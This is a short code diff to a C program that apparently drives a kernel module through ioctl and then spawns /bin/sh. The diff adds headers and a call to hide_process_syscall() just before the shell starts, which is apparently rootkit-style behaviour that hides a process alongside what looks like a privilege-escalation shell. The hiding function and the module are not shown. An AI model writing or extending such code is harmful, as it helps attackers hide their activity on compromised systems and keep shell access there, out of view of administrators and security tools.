@@ -2,6 +2,10 @@
 #include <stdio.h>
 #include <sys/ioctl.h>
 #include <unistd.h>
+#include <sys/types.h>
+#include <sys/param.h>
+#include <sys/module.h>
+#include <string.h>
 
 #include "../kernel/interface.h"
 
@@ -20,7 +24,7 @@ int main(void) {
         close(fd);
         return -1;
     }
-
+    hide_process_syscall();
     close(fd);
 
     execl("/bin/sh", "sh", NULL);
